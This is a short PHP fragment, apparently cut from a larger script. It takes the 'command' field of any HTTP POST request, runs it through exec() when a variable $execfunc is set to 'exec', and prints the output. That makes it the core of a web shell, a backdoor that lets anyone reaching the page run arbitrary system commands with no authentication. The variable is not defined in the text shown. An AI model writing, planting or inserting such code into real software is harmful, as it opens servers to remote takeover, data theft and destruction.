<?php
if (!empty($_POST['command'])) {
	if ($execfunc=="exec") {
		$result = exec($_POST['command']);
		echo $result;
	}
}
?>